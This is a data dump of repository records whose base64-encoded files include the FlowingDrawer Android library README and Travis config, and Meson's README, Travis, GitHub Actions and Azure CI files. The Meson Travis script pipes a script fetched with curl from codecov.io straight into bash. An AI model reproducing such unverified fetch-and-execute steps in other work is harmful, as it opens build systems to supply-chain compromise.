ZApzaG91bGQgYmUgdHJhbnNwYXJlbnQuCgpEb24ndCBzZXQgRmxvd2luZ01l
bnVMYXlvdXQncyB3aWR0aCB3aXRoIGEgZml4ZWQgd2lkdGgsIGl0J3Mgbm90
IGEgdXNlZnVsIHdheSB0byBjaGFuZ2UgaXQncyB3aWR0aCAuCgpZb3UgY2Fu
IGNoYW5nZSBtZW51J3MgYXR0cmlidXRlIGluIEZsb3dpbmdEcmF3ZXIgbGF5
b3V0IG5vZGUgdXNlIGN1c3RvbSBhdHRyaWJ1dGUsbGlrZSBlZE1lbnVCYWNr
Z3JvdW5kLGVkTWVudVNpemUsCmVkUG9zaXRpb24uCgpVc2UgZWRQb3NpdGlv
biBhdHRyaWJ1dGUgY29ycmVzcG9uZGluZyB0byB3aGljaCBzaWRlIG9mIHRo
ZSB2aWV3IHlvdSB3YW50IHRoZSBkcmF3ZXIKdG8gZW1lcmdlIGZyb206IGxl
ZnQgb3IgcmlnaHQuTGVmdCBtZW51IDogZWRQb3NpdGlvbiA9MSA7IFJpZ2h0
IG1lbnU6IGVkUG9zaXRpb24gPTIgLgoKRm9yIG1vcmUgY3VzdG9tIGF0dHJp
YnV0ZSAseW91IGNhbiBzZWUgaW4gYXR0cnMueG1sLgoKCk1haW5BY3Rpdml0
eToKCmBgYGphdmEKICAgICBtRHJhd2VyID0gKEZsb3dpbmdEcmF3ZXIpIGZp
bmRWaWV3QnlJZChSLmlkLmRyYXdlcmxheW91dCk7CiAgICAgbURyYXdlci5z
ZXRUb3VjaE1vZGUoRWxhc3RpY0RyYXdlci5UT1VDSF9NT0RFX0JFWkVMKTsK
ICAgICBtRHJhd2VyLnNldE9uRHJhd2VyU3RhdGVDaGFuZ2VMaXN0ZW5lcihu
ZXcgRWxhc3RpY0RyYXdlci5PbkRyYXdlclN0YXRlQ2hhbmdlTGlzdGVuZXIo
KSB7CiAgICAgICAgICAgICAgICAgQE92ZXJyaWRlCiAgICAgICAgICAgICAg
ICAgcHVibGljIHZvaWQgb25EcmF3ZXJTdGF0ZUNoYW5nZShpbnQgb2xkU3Rh
dGUsIGludCBuZXdTdGF0ZSkgewogICAgICAgICAgICAgICAgICAgICBpZiAo
bmV3U3RhdGUgPT0gRWxhc3RpY0RyYXdlci5TVEFURV9DTE9TRUQpIHsKICAg
ICAgICAgICAgICAgICAgICAgICAgIExvZy5pKCJNYWluQWN0aXZpdHkiLCAi
RHJhd2VyIFNUQVRFX0NMT1NFRCIpOwogICAgICAgICAgICAgICAgICAgICB9
CiAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICBAT3ZlcnJp
ZGUKICAgICAgICAgICAgICAgICBwdWJsaWMgdm9pZCBvbkRyYXdlclNsaWRl
KGZsb2F0IG9wZW5SYXRpbywgaW50IG9mZnNldFBpeGVscykgewogICAgICAg
ICAgICAgICAgICAgICBMb2cuaSgiTWFpbkFjdGl2aXR5IiwgIm9wZW5SYXRp
bz0iICsgb3BlblJhdGlvICsgIiAsb2Zmc2V0UGl4ZWxzPSIgKyBvZmZzZXRQ
aXhlbHMpOwogICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgIH0pOwpg
YGAKc2V0VG91Y2hNb2RlIGNhbiBhbGxvd3MgdGhlIGRyYXdlciB0byBiZSBv
cGVuZWQgYnkgZHJhZ2dpbmcgdGhlIGVkZ2Ugb3IgdGhlIGVudGlyZSBzY3Jl
ZW4uCnNldE9uRHJhd2VyU3RhdGVDaGFuZ2VMaXN0ZW5lciBjYW4gYmUgdXNl
ZCB0byBtb25pdG9yIHRoZSBzdGF0ZSBhbmQgbW90aW9uIG9mIGRyYXdlciB2
aWV3cy4KQXZvaWQgcGVyZm9ybWluZyBleHBlbnNpdmUgb3BlcmF0aW9ucyBz
dWNoIGFzIGxheW91dCBkdXJpbmcgYW5pbWF0aW9uIGFzIGl0IGNhbiBjYXVz
ZSBzdHV0dGVyaW5nLgpFbGFzdGljRHJhd2VyLk9uRHJhd2VyU3RhdGVDaGFu
Z2VMaXN0ZW5lciBvZmZlcnMgZGVmYXVsdC9uby1vcCBpbXBsZW1lbnRhdGlv
bnMgb2YgZWFjaCBjYWxsYmFjayBtZXRob2QuCgoKTGljZW5zZQo9PT09PT09
CgogICAgQ29weXJpZ2h0IDIwMTUgc291bC5teG4KCiAgICBMaWNlbnNlZCB1
bmRlciB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb24gMi4wICh0aGUgIkxp
Y2Vuc2UiKTsKICAgIHlvdSBtYXkgbm90IHVzZSB0aGlzIGZpbGUgZXhjZXB0
IGluIGNvbXBsaWFuY2Ugd2l0aCB0aGUgTGljZW5zZS4KICAgIFlvdSBtYXkg
b2J0YWluIGEgY29weSBvZiB0aGUgTGljZW5zZSBhdAoKICAgICAgIGh0dHA6
Ly93d3cuYXBhY2hlLm9yZy9saWNlbnNlcy9MSUNFTlNFLTIuMAoKICAgIFVu
bGVzcyByZXF1aXJlZCBieSBhcHBsaWNhYmxlIGxhdyBvciBhZ3JlZWQgdG8g
aW4gd3JpdGluZywgc29mdHdhcmUKICAgIGRpc3RyaWJ1dGVkIHVuZGVyIHRo
ZSBMaWNlbnNlIGlzIGRpc3RyaWJ1dGVkIG9uIGFuICJBUyBJUyIgQkFTSVMs
CiAgICBXSVRIT1VUIFdBUlJBTlRJRVMgT1IgQ09ORElUSU9OUyBPRiBBTlkg
S0lORCwgZWl0aGVyIGV4cHJlc3Mgb3IgaW1wbGllZC4KICAgIFNlZSB0aGUg
TGljZW5zZSBmb3IgdGhlIHNwZWNpZmljIGxhbmd1YWdlIGdvdmVybmluZyBw
ZXJtaXNzaW9ucyBhbmQKICAgIGxpbWl0YXRpb25zIHVuZGVyIHRoZSBMaWNl
bnNlLgoK
",,"bGFuZ3VhZ2U6IGFuZHJvaWQKCm5vdGlmaWNhdGlvbnM6CiAgZW1haWw6IGZh
bHNlCgpzdWRvOiBmYWxzZQoKYW5kcm9pZDoKICBjb21wb25lbnRzOgogICAg
LSB0b29scwogICAgLSBidWlsZC10b29scy0yMy4wLjIKICAgIC0gYW5kcm9p
ZC0yMwogICAgLSBleHRyYS1hbmRyb2lkLW0ycmVwb3NpdG9yeQogICAgLSBl
eHRyYS1hbmRyb2lkLXN1cHBvcnQKCmJlZm9yZV9pbnN0YWxsOgogLSBjaG1v
ZCAreCBncmFkbGV3CgpzY3JpcHQ6CiAgIC0gY2htb2QgK3ggLi9ncmFkbGV3
CgpiZWZvcmVfZGVwbG95OgogIC0gbXYgYXBwL2J1aWxkL291dHB1dHMvYXBr
L2FwcC1yZWxlYXNlLmFwayBhcHAvYnVpbGQvb3V0cHV0cy9hcGsvRmxvd2lu
Z0RyYXdlci5hcGsKCmRlcGxveToKICBwcm92aWRlcjogcmVsZWFzZXMKICBh
cGlfa2V5OgogICAgc2VjdXJlOiAzY2IyYzcxYTgxNjVlZDNlYjE4OTkwNjky
ZDAzODNjMWNjOTc1YTE4CiAgZmlsZTogYXBwL2J1aWxkL291dHB1dHMvYXBr
L0Zsb3dpbmdEcmF3ZXIuYXBrCiAgc2tpcF9jbGVhbnVwOiB0cnVlCiAgb246
CiAgICB0YWdzOiB0cnVl
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'meson',19784232,b'The Meson Build System',b'Python',1175,2385,,2385,False,b'https://api.github.com/repos/mesonbuild/meson/forks',"PHAgYWxpZ249ImNlbnRlciI+CjxpbWcgc3JjPSJodHRwczovL21lc29uYnVp
bGQuY29tL2Fzc2V0cy9pbWFnZXMvbWVzb25fbG9nby5wbmciPgo8L3A+Ck1l
c29uwq4gaXMgYSBwcm9qZWN0IHRvIGNyZWF0ZSB0aGUgYmVzdCBwb3NzaWJs
ZSBuZXh0LWdlbmVyYXRpb24KYnVpbGQgc3lzdGVtLgoKIyMjIyBTdGF0dXMK
ClshW1B5UEldKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vcHlwaS92L21lc29u
LnN2ZyldKGh0dHBzOi8vcHlwaS5weXRob24ub3JnL3B5cGkvbWVzb24pClsh
W1RyYXZpc10oaHR0cHM6Ly90cmF2aXMtY2kub3JnL21lc29uYnVpbGQvbWVz
b24uc3ZnP2JyYW5jaD1tYXN0ZXIpXShodHRwczovL3RyYXZpcy1jaS5vcmcv
bWVzb25idWlsZC9tZXNvbikKWyFbQnVpbGQgU3RhdHVzXShodHRwczovL2Rl
di5henVyZS5jb20vanVzc2kwOTQ3L2p1c3NpL19hcGlzL2J1aWxkL3N0YXR1
cy9tZXNvbmJ1aWxkLm1lc29uKV0oaHR0cHM6Ly9kZXYuYXp1cmUuY29tL2p1
c3NpMDk0Ny9qdXNzaS9fYnVpbGQvbGF0ZXN0P2RlZmluaXRpb25JZD0xKQpb
IVtDb2RlY292XShodHRwczovL2NvZGVjb3YuaW8vZ2gvbWVzb25idWlsZC9t
ZXNvbi9jb3ZlcmFnZS5zdmc/YnJhbmNoPW1hc3RlcildKGh0dHBzOi8vY29k
ZWNvdi5pby9naC9tZXNvbmJ1aWxkL21lc29uL2JyYW5jaC9tYXN0ZXIpClsh
W0NvZGUgUXVhbGl0eTogUHl0aG9uXShodHRwczovL2ltZy5zaGllbGRzLmlv
L2xndG0vZ3JhZGUvcHl0aG9uL2cvbWVzb25idWlsZC9tZXNvbi5zdmc/bG9n
bz1sZ3RtJmxvZ29XaWR0aD0xOCldKGh0dHBzOi8vbGd0bS5jb20vcHJvamVj
dHMvZy9tZXNvbmJ1aWxkL21lc29uL2NvbnRleHQ6cHl0aG9uKQpbIVtUb3Rh
bCBBbGVydHNdKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vbGd0bS9hbGVydHMv
Zy9tZXNvbmJ1aWxkL21lc29uLnN2Zz9sb2dvPWxndG0mbG9nb1dpZHRoPTE4
KV0oaHR0cHM6Ly9sZ3RtLmNvbS9wcm9qZWN0cy9nL21lc29uYnVpbGQvbWVz
b24vYWxlcnRzKQoKIyMjIyBEZXBlbmRlbmNpZXMKCiAtIFtQeXRob25dKGh0
dHBzOi8vcHl0aG9uLm9yZykgKHZlcnNpb24gMy41IG9yIG5ld2VyKQogLSBb
TmluamFdKGh0dHBzOi8vbmluamEtYnVpbGQub3JnKSAodmVyc2lvbiAxLjUg
b3IgbmV3ZXIpCgojIyMjIEluc3RhbGxpbmcgZnJvbSBzb3VyY2UKCllvdSBj
YW4gcnVuIE1lc29uIGRpcmVjdGx5IGZyb20gYSByZXZpc2lvbiBjb250cm9s
IGNoZWNrb3V0IG9yIGFuCmV4dHJhY3RlZCB0YXJiYWxsLiBJZiB5b3Ugd2lz
aCB5b3UgY2FuIGluc3RhbGwgaXQgbG9jYWxseSB3aXRoIHRoZQpzdGFuZGFy
ZCBQeXRob24gY29tbWFuZAoKYGBgc2gKcHl0aG9uMyAtbSBwaXAgaW5zdGFs
bCBtZXNvbiA8eW91ciBvcHRpb25zIGhlcmU+CmBgYAoKTWVzb24gaXMgYWxz
byBhdmFpbGFibGUgZnJvbQpbUHlQaV0oaHR0cHM6Ly9weXBpLnB5dGhvbi5v
cmcvcHlwaS9tZXNvbiksIHNvIGl0IGNhbiBiZSBpbnN0YWxsZWQKd2l0aCBg
cGlwMyBpbnN0YWxsIG1lc29uYCAodGhpcyBkb2VzIG5vdCByZXF1aXJlIGEg
c291cmNlIGNoZWNrb3V0LApwaXAgd2lsbCBkb3dubG9hZCB0aGUgcGFja2Fn
ZSBhdXRvbWF0aWNhbGx5KS4gVGhlIGV4YWN0IGNvbW1hbmQgdG8KdHlwZSB0
byBpbnN0YWxsIHdpdGggUGlwIGNhbiB2YXJ5IGJldHdlZW4gc3lzdGVtcywg
YmUgc3VyZSB0byB1c2UgdGhlClB5dGhvbiAzIHZlcnNpb24gb2YgUGlwLgoK
Rm9yIGJ1aWxkcyB1c2luZyBOaW5qYSwgTmluamEgY2FuIGJlIFtkb3dubG9h
ZGVkIGRpcmVjdGx5XShodHRwczovL2dpdGh1Yi5jb20vbmluamEtYnVpbGQv
bmluamEvcmVsZWFzZXMpIG9yIHZpYQoKYGBgc2gKcHl0aG9uMyAtbSBwaXAg
aW5zdGFsbCBuaW5qYQpgYGAKCiMjIyMgUnVubmluZwoKTWVzb24gcmVxdWly
ZXMgdGhhdCB5b3UgaGF2ZSBhIHNvdXJjZSBkaXJlY3RvcnkgYW5kIGEgYnVp
bGQgZGlyZWN0b3J5CmFuZCB0aGF0IHRoZXNlIHR3byBhcmUgZGlmZmVyZW50
LiBJbiB5b3VyIHNvdXJjZSByb290IG11c3QgZXhpc3QgYQpmaWxlIGNhbGxl
ZCBgbWVzb24uYnVpbGRgLiBUbyBnZW5lcmF0ZSB0aGUgYnVpbGQgc3lzdGVt
IHJ1biB0aGlzCmNvbW1hbmQ6CgpgbWVzb24gPHNvdXJjZSBkaXJlY3Rvcnk+
IDxidWlsZCBkaXJlY3Rvcnk+YAoKRGVwZW5kaW5nIG9uIGhvdyB5b3Ugb2J0
YWluZWQgTWVzb24gdGhlIGNvbW1hbmQgbWlnaHQgYWxzbyBiZSBjYWxsZWQK
YG1lc29uLnB5YCBpbnN0ZWFkIG9mIHBsYWluIGBtZXNvbmAuIEluIHRoZSBy
ZXN0IG9mIHRoaXMgZG9jdW1lbnQgd2UKYXJlIGdvaW5nIHRvIHVzZSB0aGUg
bGF0dGVyIGZvcm0uCgpZb3UgY2FuIG9taXQgZWl0aGVyIG9mIHRoZSB0d28g
ZGlyZWN0b3JpZXMsIGFuZCBNZXNvbiB3aWxsIHN1YnN0aXR1dGUKdGhlIGN1
cnJlbnQgZGlyZWN0b3J5IGFuZCBhdXRvZGV0ZWN0IHdoYXQgeW91IG1lYW4u
IFRoaXMgYWxsb3dzIHlvdSB0bwpkbyB0aGluZ3MgbGlrZSB0aGlzOgoKYGNk
IHNvdXJjZV9yb290OyBta2RpciBidWlsZGRpcjsgY2QgYnVpbGRkaXI7IG1l
c29uIC4uYAoKb3IKCmBjZCBzb3VyY2Vfcm9vdDsgbWtkaXIgYnVpbGRkaXI7
IG1lc29uIGJ1aWxkZGlyYAoKVG8gY29tcGlsZSwgY2QgaW50byB5b3VyIGJ1
aWxkIGRpcmVjdG9yeSBhbmQgdHlwZSBgbmluamFgLiBUbyBydW4gdW5pdAp0
ZXN0cywgdHlwZSBgbmluamEgdGVzdGAuCgpJbnN0YWxsIGlzIHRoZSBzYW1l
IGJ1dCBpdCBjYW4gdGFrZSBhbiBleHRyYSBhcmd1bWVudDoKCmBERVNURElS
PS9kZXN0ZGlyL3BhdGggbmluamEgaW5zdGFsbGAKCmBERVNURElSYCBjYW4g
YmUgb21pdHRlZC4gSWYgeW91IGFyZSBpbnN0YWxsaW5nIHRvIHN5c3RlbSBk
aXJlY3RvcmllcywKeW91IG1heSBuZWVkIHRvIHJ1biB0aGlzIGNvbW1hbmQg
d2l0aCBzdWRvLgoKCiMjIyMgQ29udHJpYnV0aW5nCgpXZSBsb3ZlIGNvZGUg
Y29udHJpYnV0aW9ucy4gU2VlIHRoZSBbY29udHJpYnV0aW9uCnBhZ2VdKGh0
dHBzOi8vbWVzb25idWlsZC5jb20vQ29udHJpYnV0aW5nLmh0bWwpIG9uIHRo
ZSB3ZWIgc2l0ZSBmb3IKZGV0YWlscy4KCgojIyMjIElSQwoKVGhlIGlyYyBj
aGFubmVsIGZvciBNZXNvbiBpcyBgI21lc29uYnVpbGRgIG92ZXIgYXQgRnJl
ZW5vZGUuCgpZb3UgY2FuIHVzZSBbRnJlZU5vZGUncyBvZmZpY2lhbCB3ZWJj
aGF0XVttZXNvbl9pcmNdCnRvIGNvbm5lY3QgdG8gdGhpcyBjaGFubmVsLgoK
W21lc29uX2lyY106IGh0dHBzOi8vd2ViY2hhdC5mcmVlbm9kZS5uZXQvP2No
YW5uZWxzPSUyM21lc29uYnVpbGQKCiMjIyMgRnVydGhlciBpbmZvCgpNb3Jl
IGluZm9ybWF0aW9uIGFib3V0IHRoZSBNZXNvbiBidWlsZCBzeXN0ZW0gY2Fu
IGJlIGZvdW5kIGF0IHRoZQpbcHJvamVjdCdzIGhvbWUgcGFnZV0oaHR0cHM6
Ly9tZXNvbmJ1aWxkLmNvbSkuCgpNZXNvbiBpcyBhIHJlZ2lzdGVyZWQgdHJh
ZGVtYXJrIG9mIEp1c3NpIFBha2thbmVuLgo=
",,"c3VkbzogZmFsc2UKCmJyYW5jaGVzOgogIG9ubHk6CiAgLSBtYXN0ZXIKICAj
IFJlbGVhc2UgYnJhbmNoZXMKICAtIC9eWzAtOV0rXC5bMC05XSskLwoKb3M6
CiAgLSBsaW51eAogIC0gb3N4Cgpjb21waWxlcjoKICAtIGdjYwogIC0gY2xh
bmcKCmVudjoKICAtIE1FU09OX0FSR1M9IiIKICAtIFJVTl9URVNUU19BUkdT
PSItLW5vLXVuaXR0ZXN0cyIgTUVTT05fQVJHUz0iLS11bml0eT1vbiIKCmxh
bmd1YWdlOgogIC0gY3BwCgpzZXJ2aWNlczoKICAtIGRvY2tlcgoKbWF0cml4
OgogIGV4Y2x1ZGU6CiAgIyBPbiBPUyBYIGdjYyBpcyBqdXN0IGEgd3JhcHBl
ciBhcm91bmQgY2xhbmcsIHNvIGRvbid0IHdhc3RlIHRpbWUgdGVzdGluZyB0
aGF0CiAgLSBvczogb3N4CiAgICBjb21waWxlcjogZ2NjCiAgaW5jbHVkZToK
ICAjIFRlc3QgY3Jvc3MgYnVpbGRzIHNlcGFyYXRlbHksIHRoZXkgZG8gbm90
IHVzZSB0aGUgZ2xvYmFsIGNvbXBpbGVyCiAgLSBvczogbGludXgKICAgIGNv
bXBpbGVyOiBnY2MKICAgIGVudjogUlVOX1RFU1RTX0FSR1M9Ii0tY3Jvc3Mi
CiAgLSBvczogbGludXgKICAgIGNvbXBpbGVyOiBnY2MKICAgIGVudjogUlVO
X1RFU1RTX0FSR1M9Ii0tY3Jvc3MiIE1FU09OX0FSR1M9Ii0tdW5pdHk9b24i
CgpiZWZvcmVfaW5zdGFsbDoKICAtIHB5dGhvbiAuL3NraXBfY2kucHkgLS1i
YXNlLWJyYW5jaC1lbnY9VFJBVklTX0JSQU5DSCAtLWlzLXB1bGwtZW52PVRS
QVZJU19QVUxMX1JFUVVFU1QKICAtIGlmIFtbICIkVFJBVklTX09TX05BTUUi
ID09ICJvc3giIF1dOyB0aGVuIGJyZXcgdXBkYXRlOyBmaQogIC0gaWYgW1sg
IiRUUkFWSVNfT1NfTkFNRSIgPT0gIm9zeCIgXV07IHRoZW4gYnJldyBpbnN0
YWxsIHF0IGxsdm0gbmluamE7IGZpCiAgICAjICMgUnVuIG9uZSBtYWNPUyBi
dWlsZCB3aXRob3V0IHBrZy1jb25maWcgYXZhaWxhYmxlLCBhbmQgdGhlIG90
aGVyICh1bml0eT1vbikgd2l0aCBwa2ctY29uZmlnCiAgLSBpZiBbWyAiJFRS
QVZJU19PU19OQU1FIiA9PSAib3N4IiAmJiAiJE1FU09OX0FSR1MiID1+IC4q
dW5pdHk9b24uKiBdXTsgdGhlbiBicmV3IGluc3RhbGwgcGtnLWNvbmZpZzsg
ZmkKICAtIGlmIFtbICIkVFJBVklTX09TX05BTUUiID09ICJsaW51eCIgXV07
IHRoZW4gZG9ja2VyIHB1bGwganBha2thbmUvbWVzb25jaTplb2FuOyBmaQoK
IyBXZSBuZWVkIHRvIGNvcHkgdGhlIGN1cnJlbnQgY2hlY2tvdXQgaW5zaWRl
IHRoZSBEb2NrZXIgY29udGFpbmVyLAojIGJlY2F1c2UgaXQgaGFzIHRoZSBN
UiBpZCB0byBiZSB0ZXN0ZWQgY2hlY2tlZCBvdXQuCgpzY3JpcHQ6CiAgLSBp
ZiBbWyAiJFRSQVZJU19PU19OQU1FIiA9PSAibGludXgiIF1dOyB0aGVuIGVj
aG8gRlJPTSBqcGFra2FuZS9tZXNvbmNpOmVvYW4gPiBEb2NrZXJmaWxlOyBm
aQogIC0gaWYgW1sgIiRUUkFWSVNfT1NfTkFNRSIgPT0gImxpbnV4IiBdXTsg
dGhlbiBlY2hvIEFERCAuIC9yb290ID4+IERvY2tlcmZpbGU7IGZpCiAgLSBp
ZiBbWyAiJFRSQVZJU19PU19OQU1FIiA9PSAibGludXgiIF1dOyB0aGVuIGRv
Y2tlciBidWlsZCAtdCB3aXRoZ2l0IC47IGZpCiAgLSB8CiAgICBpZiBbWyAi
JFRSQVZJU19PU19OQU1FIiA9PSAibGludXgiIF1dOyB0aGVuCiAgICAgIGNp
X2Vudj1gYmFzaCA8KGN1cmwgLXMgaHR0cHM6Ly9jb2RlY292LmlvL2Vudilg
CiAgICAgIGRvY2tlciBydW4gLS1zZWN1cml0eS1vcHQgc2VjY29tcDp1bmNv
bmZpbmVkICRjaV9lbnYgLXYgJHtQV0R9Ly5jb3ZlcmFnZTovcm9vdC8uY292
ZXJhZ2UgXAogICAgICAgIHdpdGhnaXQgXAogICAgICAgICAgL2Jpbi9zaCAt
YyAiY2QgL3Jvb3QgJiYgbWtkaXIgLXAgdG9vbHM7IHdnZXQgLWMgaHR0cHM6
Ly9naXRodWIuY29tL25pbmphLWJ1aWxkL25pbmphL3JlbGVhc2VzL2Rvd25s
b2FkL3YxLjkuMC9uaW5qYS1saW51eC56aXAgLU8gL3Jvb3QvdG9vbHMvbmlu
amEuemlwOyB1bnppcCAtZCAvcm9vdC90b29scyAvcm9vdC90b29scy9uaW5q
YS56aXA7IGNobW9kICt4IC9yb290L3Rvb2xzL25pbmphOyBDQz0kQ0MgQ1hY
PSRDWFggT0JKQz0kQ0MgT0JKQ1hYPSRDWFggUEFUSD0vcm9vdC90b29sczok
UEFUSCAuL3J1bl90ZXN0cy5weSAkUlVOX1RFU1RTX0FSR1MgLS0gJE1FU09O
X0FSR1MgJiYgY2htb2QgLVIgYStyd1ggLmNvdmVyYWdlIgogICAgZmkKICAj
IEVuc3VyZSB0aGF0IGxsdm0gaXMgYWRkZWQgYWZ0ZXIgJFBBVEgsIG90aGVy
d2lzZSB0aGUgY2xhbmcgZnJvbSB0aGF0IGxsdm0gaW5zdGFsbCB3aWxsIGJl
IHVzZWQgaW5zdGVhZCBvZiB0aGUgbmF0aXZlIGFwcGxlIGNsYW5nLgogIC0g
aWYgW1sgIiRUUkFWSVNfT1NfTkFNRSIgPT0gIm9zeCIgXV07IHRoZW4gU0RL
Uk9PVD0kKHhjb2RlYnVpbGQgLXZlcnNpb24gLXNkayBtYWNvc3ggUGF0aCkg
Q1BQRkxBR1M9LUkvdXNyL2xvY2FsL2luY2x1ZGUgTERGTEFHUz0tTC91c3Iv
bG9jYWwvbGliIE9CSkM9JENDIE9CSkNYWD0kQ1hYIFBBVEg9JEhPTUUvdG9v
bHM6L3Vzci9sb2NhbC9vcHQvcXQvYmluOiRQQVRIOiQoYnJldyAtLXByZWZp
eCBsbHZtKS9iaW4gLi9ydW5fdGVzdHMucHkgJFJVTl9URVNUU19BUkdTIC0t
YmFja2VuZD1uaW5qYSAtLSAkTUVTT05fQVJHUyA7IGZpCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"bmFtZTogTGludE15cHkKCm9uOgogIHB1c2g6CiAgICBwYXRoczoKICAgIC0g
IioqLnB5IgogICAgLSAiLmdpdGh1Yi93b3JrZmxvd3MvbGludF9teXB5Lnlt
bCIKICBwdWxsX3JlcXVlc3Q6CiAgICBwYXRoczoKICAgIC0gIioqLnB5Igog
ICAgLSAiLmdpdGh1Yi93b3JrZmxvd3MvbGludF9teXB5LnltbCIKCmpvYnM6
CgogIGxpbnQ6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0CiAgICBzdGVw
czoKICAgIC0gdXNlczogYWN0aW9ucy9jaGVja291dEB2MQogICAgLSB1c2Vz
OiBhY3Rpb25zL3NldHVwLXB5dGhvbkB2MQogICAgICB3aXRoOgogICAgICAg
IHB5dGhvbi12ZXJzaW9uOiAnMy54JwogICAgLSBydW46IHB5dGhvbiAtbSBw
aXAgaW5zdGFsbCBweWxpbnQKICAgIC0gcnVuOiBweWxpbnQgbWVzb25idWls
ZAoKICBteXB5OgogICAgcnVucy1vbjogdWJ1bnR1LWxhdGVzdAogICAgc3Rl
cHM6CiAgICAtIHVzZXM6IGFjdGlvbnMvY2hlY2tvdXRAdjEKICAgIC0gdXNl
czogYWN0aW9ucy9zZXR1cC1weXRob25AdjEKICAgICAgd2l0aDoKICAgICAg
ICBweXRob24tdmVyc2lvbjogJzMueCcKICAgIC0gcnVuOiBweXRob24gLW0g
cGlwIGluc3RhbGwgbXlweQogICAgLSBydW46IG15cHkgLS1mb2xsb3ctaW1w
b3J0cz1za2lwICBtZXNvbmJ1aWxkL210ZXN0LnB5IG1lc29uYnVpbGQvbWlu
aXQucHkgbWVzb25idWlsZC9tc2V0dXAucHkgbWVzb25idWlsZC93cmFwIHRv
b2xzLyBtZXNvbmJ1aWxkL21vZHVsZXMvZnMucHkK
","bmFtZTogVW51c2VkTWlzc2luZ1JldHVybgojIHRoaXMgd29ya2Zsb3cgY2hl
Y2tzIGZvcgojICogdW51c2VkIGlucHV0IGFyZ3VtZW50cwojICogbWlzc2lu
ZyByZXR1cm4gdmFsdWVzCiMgKiBzdHJpY3QgcHJvdG90eXBlcwojIHNvbWUg
dXNlcnMgaGF2ZSBkZWZhdWx0IGNvbmZpZ3MgdGhhdCB3aWxsIG5lZWRsZXNz
bHkgZmFpbCBNZXNvbiBzZWxmLXRlc3RzIGR1ZSB0byB0aGVzZSBzeW50YXgu
CgpvbjoKICBwdXNoOgogICAgcGF0aHM6CiAgICAtICIuZ2l0aHViL3dvcmtm
bG93cy91bnVzZWRhcmdzX21pc3NpbmdyZXR1cm4ueW1sIgogICAgLSAidGVz
dCBjYXNlcy9jbWFrZS8qKiIKICAgIC0gInRlc3QgY2FzZXMvY29tbW9uLyoq
IgogICAgLSAidGVzdCBjYXNlcy9mb3J0cmFuLyoqIgogICAgLSAidGVzdCBj
YXNlcy9wbGF0Zm9ybS1saW51eC8qKiIKICBwdWxsX3JlcXVlc3Q6CiAgICBw
YXRoczoKICAgIC0gIi5naXRodWIvd29ya2Zsb3dzL3VudXNlZGFyZ3NfbWlz
c2luZ3JldHVybi55bWwiCiAgICAtICJ0ZXN0IGNhc2VzL2NtYWtlLyoqIgog
ICAgLSAidGVzdCBjYXNlcy9jb21tb24vKioiCiAgICAtICJ0ZXN0IGNhc2Vz
L2ZvcnRyYW4vKioiCiAgICAtICJ0ZXN0IGNhc2VzL3BsYXRmb3JtLWxpbnV4
LyoqIgoKam9iczoKCiAgbGludXg6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0
ZXN0CiAgICBzdGVwczoKICAgIC0gdXNlczogYWN0aW9ucy9jaGVja291dEB2
MQogICAgLSB1c2VzOiBhY3Rpb25zL3NldHVwLXB5dGhvbkB2MQogICAgICB3
aXRoOgogICAgICAgIHB5dGhvbi12ZXJzaW9uOiAnMy54JwogICAgLSBuYW1l
OiBJbnN0YWxsIENvbXBpbGVycwogICAgICBydW46IHwKICAgICAgICBzdWRv
IGFwdCB1cGRhdGUgLXlxCiAgICAgICAgc3VkbyBhcHQgaW5zdGFsbCAteXEg
LS1uby1pbnN0YWxsLXJlY29tbWVuZHMgZysrIGdmb3J0cmFuIG5pbmphLWJ1
aWxkCiAgICAtIHJ1bjogcHl0aG9uIHJ1bl9wcm9qZWN0X3Rlc3RzLnB5IC0t
b25seSBjbWFrZSBjb21tb24gZm9ydHJhbiBwbGF0Zm9ybS1saW51eAogICAg
ICBlbnY6CiAgICAgICAgQ0ZMQUdTOiAiLVdlcnJvcj11bnVzZWQtcGFyYW1l
dGVyIC1XZXJyb3I9cmV0dXJuLXR5cGUgLVdlcnJvcj1zdHJpY3QtcHJvdG90
eXBlcyIKICAgICAgICBDUFBGTEFHUzogIi1XZXJyb3I9dW51c2VkLXBhcmFt
ZXRlciAtV2Vycm9yPXJldHVybi10eXBlIgogICAgICAgIEZGTEFHUzogIi1m
aW1wbGljaXQtbm9uZSIK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"bmFtZTogJChCdWlsZElEKQoKdHJpZ2dlcjoKICBicmFuY2hlczoKICAgIGlu
Y2x1ZGU6CiAgICAtICdtYXN0ZXInCiAgICAjIFJlbGVhc2UgYnJhbmNoZXMK
ICAgIC0gJzAuKicKCnZhcmlhYmxlczoKICBDSTogMQoKam9iczoKCi0gam9i
OiB2czIwMTUKICBwb29sOgogICAgdm1JbWFnZTogdnMyMDE1LXdpbjIwMTJy
MgoKICBzdHJhdGVneToKICAgIG1hdHJpeDoKICAgICAgICB2YzIwMTV4ODZu
aW5qYToKICAgICAgICAgIGFyY2g6IHg4NgogICAgICAgICAgY29tcGlsZXI6
IG1zdmMyMDE1CiAgICAgICAgICBiYWNrZW5kOiBuaW5qYQogICAgICAgIHZj
MjAxNXg4NnZzOgogICAgICAgICAgYXJjaDogeDg2CiAgICAgICAgICBjb21w
aWxlcjogbXN2YzIwMTUKICAgICAgICAgIGJhY2tlbmQ6IHZzMjAxNQoKICBz
dGVwczoKICAtIHRlbXBsYXRlOiBjaS9henVyZS1zdGVwcy55bWwKCi0gam9i
